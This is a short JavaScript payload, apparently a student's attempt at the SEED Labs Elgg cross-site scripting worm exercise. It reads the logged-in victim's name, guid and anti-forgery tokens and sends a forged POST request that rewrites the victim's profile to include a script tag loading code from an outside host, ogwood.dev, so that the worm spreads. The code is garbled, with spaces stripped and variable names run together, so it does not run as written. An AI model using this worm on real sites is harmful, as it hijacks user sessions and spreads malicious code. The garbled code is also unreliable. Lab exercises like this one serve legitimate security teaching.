 window.onload=function(){
 //JavaScriptcodetoaccessusername,userguid,TimeStamp__elgg_ts
 //andSecurityToken__elgg_token
 varuserName="&name="+elgg.session.user.name;
 varguid="&guid="+elgg.session.user.guid;
 varts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 vartoken="&__elgg_token="+elgg.security.token.__elgg_token;
 //Constructthecontentofyoururl.
 varcontent="<script type='text/javascript' src='https://www.ogwood.dev/seed2.js'></script>"; //FILLIN
 varsamyGuid=59; //FILLIN
 varsendurl="http://www.seed-server.com/profile/" + elgg.session.user.name + varuserName + varguid + varts + vartoken + "&briefdescription=" + varcontent; //FILLIN
 if(elgg.session.user.guid!=varsamyGuid)
 {
 //CreateandsendAjaxrequesttomodifyprofile
 varAjax=null;
 Ajax=new XMLHttpRequest();
 Ajax.open("POST",sendurl,true);
 Ajax.setRequestHeader("Content-Type",
 "application/x-www-form-urlencoded");
 Ajax.send(content);
 }
 }
